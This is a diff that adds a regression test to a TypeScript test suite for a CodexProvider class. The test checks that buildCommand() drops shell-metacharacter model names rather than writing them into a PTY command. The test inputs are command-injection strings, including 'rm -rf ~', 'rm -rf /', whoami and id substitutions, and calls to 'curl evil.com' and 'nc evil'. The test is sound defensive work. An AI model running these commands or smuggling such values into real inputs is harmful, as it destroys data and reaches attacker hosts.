@@ -83,6 +83,27 @@ describe('CodexProvider', () => {
       expect(modelIdx).toBeGreaterThan(-1);
       expect(approvalIdx).toBeGreaterThan(-1);
     });
+
+    // Regression coverage for issue #150 (mirrors claude-provider.test.ts's
+    // #116 coverage): options.model is untrusted (reachable over the remote
+    // WS bridge with only a token as gate) and is written straight into a PTY
+    // as `codex ... --model <value>`. session-manager.ts is the primary gate
+    // via normalizeModel(), but buildCommand() must never trust its caller
+    // either, in case something reaches it directly.
+    it.each([
+      '; rm -rf ~',
+      'o3`whoami`',
+      'o3$(id)',
+      'o3 && curl evil.com',
+      'o3|nc evil 1',
+      'o3\nrm -rf /',
+      'o3 with spaces',
+    ])('drops a metacharacter-laden model (%j) instead of appending it to the command', (maliciousModel) => {
+      const cmd = provider.buildCommand({ ...baseOptions, model: maliciousModel });
+      expect(cmd).not.toContain('--model');
+      expect(cmd).not.toContain(maliciousModel);
+      expect(cmd).not.toMatch(/[;`$|&\n]/);
+    });
   });
 
   describe('getReadinessPatterns()', () => {
